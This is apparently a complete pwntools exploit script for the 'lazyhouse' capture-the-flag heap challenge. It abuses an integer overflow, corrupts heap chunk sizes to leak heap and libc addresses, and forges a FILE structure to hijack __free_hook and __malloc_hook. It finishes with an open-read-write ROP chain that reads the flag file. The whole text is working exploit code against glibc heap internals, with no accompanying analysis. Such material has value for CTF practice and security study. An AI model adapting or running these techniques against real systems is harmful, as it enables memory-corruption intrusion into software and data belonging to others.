from pwn import *

context.arch = "amd64"

r = process("./lazyhouse", env = {'LD_PRELOAD' : './libc.so.6'}, stdin = PTY)

def buy(index, size, content, inf = False):
    r.sendlineafter("choice: ", "1")
    r.sendlineafter("Index:", str(index))
    r.sendlineafter("Size:", str(size))
    if inf:
        pass
    else:
        r.sendafter("House:", content)

def show(index):
    r.sendlineafter("choice: ", "2")
    r.sendlineafter("Index:", str(index))

def sell(index):
    r.sendlineafter("choice: ", "3")
    r.sendlineafter("Index:", str(index))

def upgrade(index, content):
    r.sendlineafter("choice: ", "4")
    r.sendlineafter("Index:", str(index))
    r.sendafter("House:", content)

def buy_super(content):
    r.sendlineafter("choice: ", "5")
    r.sendafter("House:", content)

libc = ELF("./libc.so.6")
#flag = '/home/lazyhouse/flag\0'
flag = './flag\0'

# Get infinite money
buy(0, 0x100000000000000ff/0xda, '', inf = True)
sell(0)
# Setup for later
# Buy and sell 3 chunks of size 0x3a0, also craft some values
for i in range(3):
    buy(0, 0x3a0, 'A'*224 + p64(0x300) + p64(0x2c0))
    sell(0)
# Buy and sell 1 chunk of size 0x390 and 1 chunk of size 0x217
buy(0, 0x390, 'A')
sell(0)
buy(0, 0x217, 'A')
sell(0)
# Fill 0x1c0 tcache bin
for i in range(7):
    buy(0, 0x1c0, 'A')
    sell(0)
# Fill 0x2f0 tcache bin
for i in range(7):
    buy(0, 0x2f0, 'A')
    sell(0)
# Setup initial state of step 3
buy(0, 0x80, 'A')
buy(1, 0x80, 'B')
buy(2, 0x80, 'C')
buy(3, 0x80, 'D')
buy(4, 0x4b0, 'E'*16 + p64(0) + p64(0x4a1))
buy(5, 0x80, 'F')
buy(6, 0x270, 'G')
sell(6)
# Upgrade [0] and overwrite [1]'s size
upgrade(0, 'A'*0x80 + p64(0) + p64(0x1d1))
# Sell and re-buy [1] to overwrite [2] and [3]'s sizes
sell(1)
buy(1, 0x1c0, 'B'*0x80 + p64(0) + p64(0x21) + p64(0)*3 + p64(0x71) + 'B'*0x60 + p64(0) + p64(0x31) + p64(0)*5 + p64(0x61) + 'B'*0x50 + p64(0) + p64(0x4c1))
# Sell [2], [3] and [4]
sell(2)
sell(3)
sell(4)
# Show [1], leak heap and libc
show(1)
leak = r.recvuntil('$')
heap = u64(leak[0x98:0x98+8]) - 0x10
unsorted_head = u64(leak[0x1b0:0x1b0+8])
libc_base = unsorted_head - 1985696
libc.address = libc_base
log.info('heap: ' + hex(heap))
log.info('libc: ' + hex(libc_base))
# Some useful values ([1], [2], [3], [4] and fake's addresses and libc's gadgets)
first = heap + 0x3560
second = heap + 0x3600
third = heap + 0x3690
fourth = heap + 0x3710
fake = heap + 0x40
rdi = libc.address + 0x26542
rsi = libc.address + 0x26f9e
rdx = libc.address + 0x12bda6
rax = libc.address + 0x47cf8
syscall = libc.address + 0xcf6c5
xchg_eax_edi = libc.address + 0x145585
# Upgrade [1] to setup step 4, note that here we shifted [2] and [3] downward by 0x10 bytes, so that pointers in tcache_perthread_struct points at their metadata
upgrade(1, flag.ljust(0x90, "B") + p64(0) + p64(0x21) + p64(fourth) + p64(fake) + p64(0x20) + p64(0x70) + 'B'*0x60 + p64(0) + p64(0x31) + p64(fake) + p64(unsorted_head) + p64(0) * 2 + p64(0x30) + p64(0x60) + 'B'*0x40 + p64(0) + p64(0x4c1) + p64(unsorted_head) + p64(second))
flag_addr = first + 0x10
# Build fake FILE struct
fd = fit({
    0x0: 0x800,
    0x10: libc.symbols['environ'],
    0x20: libc.symbols['environ'],
    0x28: libc.symbols['environ'] + 8,
    0x38: libc.symbols['__malloc_hook'],
    0x40: libc.symbols['__malloc_hook'] + 8,
    0xc0: p32(0xffffffff),
    0xd8: libc.symbols['_IO_file_jumps']
    }, filler = "\0")
fd = fd.ljust(0x100,'\0')
# Buy a house now will result in a chunk at fake, we put fd there and overwrite tcache_entry of 0x220 list to __free_hook
buy(2, 0x2f0, fd + p64(libc.symbols['__free_hook']))
# Buy super house will malloc at __free_hook, we overwrite it with __uflow
buy_super(p64(libc.symbols['__uflow']).ljust(0x217, "S"))
# Sell will call free() -> __uflow()
sell(2)
# Get the stack leak
stack = u64(r.recv(8)) - 0x290
log.info("stack: " + hex(stack))
# Overwrite __malloc_hooks with gets()
r.send(p64(libc.symbols['gets']))
# Build open - read - write ROP
rop = flat(rdi, flag_addr, rsi, 0, rax, 2, syscall)
rop += flat(xchg_eax_edi, rsi, heap, rdx, 0x100, libc.symbols['read'])
rop += flat(rdi, 1, rsi, heap, rdx, 0x100, libc.symbols['write'])
# Call calloc() -> gets() and overwrite its own return address with ROP
r.sendlineafter("choice: ", "1")
r.sendlineafter("Index:", "2")
r.sendlineafter("Size:", str(stack))
r.sendline(rop)


r.interactive()
